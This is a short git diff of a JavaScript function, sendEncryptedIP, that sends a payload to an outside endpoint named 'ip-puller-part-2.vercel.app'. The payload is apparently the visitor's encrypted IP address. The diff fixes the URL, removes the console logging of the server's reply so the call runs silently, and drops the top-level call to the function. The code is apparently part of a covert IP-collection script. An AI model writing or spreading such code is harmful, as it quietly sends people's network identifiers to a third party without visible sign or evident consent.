@@ -33,7 +33,7 @@ async function sendEncryptedIP() {
         };
 
         try {
-            const response = await fetch('https://ip-puller-part-2.vercel.app//api/receiveData', {
+            const response = await fetch('https://ip-puller-part-2.vercel.app/api/receiveData', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -41,12 +41,9 @@ async function sendEncryptedIP() {
                 body: JSON.stringify(payload),
             });
 
-            const result = await response.json();
-            console.log('Response from API:', result);
+            await response.json();
         } catch (error) {
             console.error('Error sending data:', error);
         }
     }
 }
-
-sendEncryptedIP();
